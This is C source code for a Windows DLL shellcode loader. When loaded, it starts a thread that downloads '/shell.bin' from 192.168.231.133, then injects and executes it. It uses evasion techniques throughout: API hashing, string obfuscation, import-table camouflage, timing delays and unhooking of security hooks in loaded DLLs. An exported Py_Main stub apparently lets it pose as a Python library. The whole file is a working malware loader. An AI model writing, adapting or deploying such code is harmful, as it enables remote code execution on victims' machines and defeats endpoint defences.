#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PWSTR url = L"192.168.231.133";
PWSTR endpoint = L"/shell.bin";
SIZE_T sSize = (SIZE_T) NULL;
APIS apis = { 0 };

extern __declspec(dllexport) int Py_Main() {
    while (TRUE) {}
}

extern __declspec(dllexport) int Attack()
{
    PVOID        pVehHandler            = NULL;
    PVOID       pInjectedPayload    = NULL;

    ApiHammering(1000);

    if (pPayload == NULL || sSize == NULL)
    {
        return -1;
    }

    IatCamouflage();

    HMODULE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH( kernel32_handle, AddVectoredExceptionHandler_CRC32);
    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(kernel32_handle, RemoveVectoredExceptionHandler_CRC32);

    ApiHammering(1000);

    if (pAddVectoredExceptionHandler == NULL || pRemoveVectoredExceptionHandler == NULL)
    {
        return -1;
    }

    pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (pVehHandler == NULL)
        return -1;

    ApiHammering(1000);

    UnhookAllLoadedDlls();

    if (!pRemoveVectoredExceptionHandler(pVehHandler))
        return -1;

    ApiHammering(1000);

    if (!Inject(&pInjectedPayload))
    {
        return -1;
    }

    ApiHammering(1000);

    Execute(pInjectedPayload);

    return 0;
}

EXTERN_C DWORD fetch_payload()
{
    sSize = Download(&pPayload, url, endpoint, FALSE);
    Attack();
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH: {
            fnLoadLibraryA pLoadLibraryA;
            HANDLE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
            pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_CRC32);

            // MessageBoxA(NULL, "Hello", "Hello", MB_OK);

            CHAR msvcrt_dll[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
            apis.handles.mscvtdll = pLoadLibraryA(msvcrt_dll);
            apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, memset_CRC32);
            apis.msvcrt._time64 = (_TIME64)GetProcAddressH(apis.handles.mscvtdll, _time64_CRC32);
            apis.msvcrt.printf = (_PRINTF)GetProcAddressH(apis.handles.mscvtdll, printf_CRC32);
            apis.msvcrt.rand = (_RAND)GetProcAddressH(apis.handles.mscvtdll, rand_CRC32);
            apis.msvcrt.sprintf = (_SPRINTF)GetProcAddressH(apis.handles.mscvtdll, sprintf_CRC32);
            apis.msvcrt.srand = (_SRAND)GetProcAddressH(apis.handles.mscvtdll, srand_CRC32);
            apis.msvcrt.memcpy = (_MEMCPY)GetProcAddressH(apis.handles.mscvtdll, memcpy_CRC32);
            apis.msvcrt.memcmp = (_MEMCMP)GetProcAddressH(apis.handles.mscvtdll, memcmp_CRC32);
            apis.msvcrt.strlen = (_STRLEN) GetProcAddressH(apis.handles.mscvtdll, strlen_CRC32);
            apis.msvcrt.realloc = (_REALLOC) GetProcAddressH(apis.handles.mscvtdll, realloc_CRC32);
            apis.msvcrt.malloc = (_MALLOC) GetProcAddressH(apis.handles.mscvtdll, malloc_CRC32);
            apis.msvcrt.wcscat = (_WCSCAT) GetProcAddressH(apis.handles.mscvtdll, wcscat_CRC32);
            apis.msvcrt.wcslen = (_WCSLEN) GetProcAddressH(apis.handles.mscvtdll, wcslen_CRC32);

            CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}